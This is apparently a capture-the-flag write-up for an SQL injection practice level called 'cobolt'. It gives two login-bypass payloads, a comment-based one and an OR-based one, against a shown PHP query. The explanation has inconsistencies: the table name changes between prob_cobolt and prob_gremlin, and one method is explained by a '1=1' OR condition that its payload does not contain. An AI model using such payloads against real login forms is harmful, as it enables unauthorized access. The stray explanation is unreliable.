---
custom_edit_url: null
pagination_next: null
pagination_prev: null
sidebar_position: 2
---

![1](https://github.com/Kunull/Write-ups/assets/110326359/a20d5977-f907-4582-8e92-88ff3b574002)

We are provided with the SQL query:

```sql
SELECT id FROM prob_cobolt WHERE id='{$_GET[id]}' AND pw=md5('{$_GET[pw]}')`
```

This time the application requires us to query for the id `admin`.

### Method 1
In order to make the result of this query `True`, we can provide the following URI:

```
?id=admin' -- -
```

The resultant query then becomes:

```sql
SELECT id FROM prob_gremlin WHERE id='admin' -- -' AND pw=md5('')

## Queried part
SELECT id FROM prob_gremlin WHERE id='admin'

## Commented part
AND pw=md5('')
```

Since 1=1 is always true, the result of the `OR` operation will always be `True`.

![2](https://github.com/Kunull/Write-ups/assets/110326359/0e1140d5-c226-41e0-9aee-b022a2b9a28f)


### Method 2
We can also make teh statement true using the following input:

```
?pw=') OR (id='admin
```

The resultant query will be:

```sql
SELECT id FROM prob_gremlin WHERE id='admin' AND pw=md5('') OR (id='admin')
```

![3](https://github.com/Kunull/Write-ups/assets/110326359/5c5d2723-8a7e-4ac1-81c4-67d5084b7506)
